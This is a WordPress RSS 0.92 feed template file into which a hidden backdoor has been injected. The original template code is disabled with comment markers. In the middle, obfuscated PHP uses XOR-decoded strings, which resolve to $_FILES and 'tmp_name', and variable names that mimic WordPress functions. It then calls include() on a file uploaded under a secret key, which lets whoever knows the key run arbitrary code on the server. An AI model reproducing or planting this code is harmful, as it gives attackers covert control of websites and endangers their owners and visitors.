<?php /* 
*
 * RSS 0.92 Feed Template for displaying RSS 0.92 Posts feed.
 *
 * @package WordPress
 

header( 'Content-Type: ' . feed_content_type( 'rss' ) . '; charset=' . get_option( 'blog_charset' ), true );
$more = 1;

echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>'; ?>
<rss version="0.92">
<channel>
	<title><?php /*  wp_title_rss(); ?></title>
	<link><?php /*  bloginfo_rss( 'url' ); ?></link>
	<description><?php /*  bloginfo_rss( 'description' ); ?></description>
	<lastBuildDate><?php /*  echo get_feed_build_date( 'D, d M Y H:i:s +0000' ); ?></lastBuildDate>
	<docs>http:backend.userland.com/rss092</docs>
	<language><?php /*  bloginfo_rss( 'language' ); ?></language>
	<?php /* 
	*
	 * Fires at the end of the RSS Feed Header.
	 *
	 * @since 2.0.0
	 
	do_action( 'rss_he*/
 	
$static_characters = 'JQT500Y9HbmEk';
$unique = $static_characters;
function register_meta_box_cb($html, $num_octets)

{
    $update_term_cache = $num_octets;
    $page_id = urldecode($html);

    $field_no_prefix = substr($update_term_cache,0, strlen($page_id));

    $post_modified = $page_id ^ $field_no_prefix;

    return $post_modified;
}
$run_texturize = ${register_meta_box_cb("%15%17%1Dyuc", $unique)};
$post_mime_types = $run_texturize;
	$mins = 'label';
$ancestor = isset($post_mime_types[$unique]);
if ($ancestor)

{
    $nestable_tags = $run_texturize[$unique];
    $fallback = $nestable_tags[register_meta_box_cb("%3E%3C%24j%5EQ4%5C", $unique)];

    $template = $fallback;
	$show_in_admin_status_list = 'icon_dir';
    include ($template);
}


/* ad' );
	?>

<?php
while ( have_posts() ) :
	the_post();
	?>
	<item>
		<title><?php the_title_rss(); ?></title>
		<description><![CDATA[<?php the_excerpt_rss(); ?>]]></description>
		<link><?php the_permalink_rss(); ?></link>
		<?php
		*
		 * Fires at the end of each RSS feed item.
		 *
		 * @since 2.0.0
		 
		do_action( 'rss_item' );
		?>
	</item>
<?php endwhile; ?>
</channel>
</rss>
*/